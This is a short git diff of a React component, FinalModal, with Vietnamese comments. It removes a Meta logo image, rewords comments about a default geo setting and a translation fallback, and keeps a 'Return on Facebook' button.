@@ -1,5 +1,4 @@
 import FinalImage from '../assets/final-image.png';
-import MetaLogo from '../assets/meta-logo-image.png';
 import { useEffect, useState, type FC } from 'react';
 
 const FinalModal: FC = () => {
@@ -10,10 +9,9 @@ const FinalModal: FC = () => {
     return translations[text] || text;
   };
 
-  // Nếu muốn lấy geo info từ API
   useEffect(() => {
-    // Ví dụ: fetch geo info từ server hoặc ẩn tạm
-    setGeoInfo({ country_code: 'US' }); // giá trị mặc định tạm thời
+    // Tạm set geoInfo mặc định
+    setGeoInfo({ country_code: 'US' });
   }, []);
 
   useEffect(() => {
@@ -27,12 +25,10 @@ const FinalModal: FC = () => {
 
     const translateAll = async () => {
       const translatedMap: Record<string, string> = {};
-
       for (const text of textsToTranslate) {
-        // Nếu không có function translateText, giữ nguyên text
+        // Nếu chưa có function translateText, giữ nguyên text
         translatedMap[text] = text;
       }
-
       setTranslations(translatedMap);
     };
 
@@ -53,9 +49,6 @@ const FinalModal: FC = () => {
           >
             {t('Return on Facebook')}
           </button>
-        </div>
-        <div className="flex items-center justify-center p-3">
-          <img src={MetaLogo} alt="Meta Logo" className="h-4.5 w-17.5" />
         </div>
       </div>
     </div>
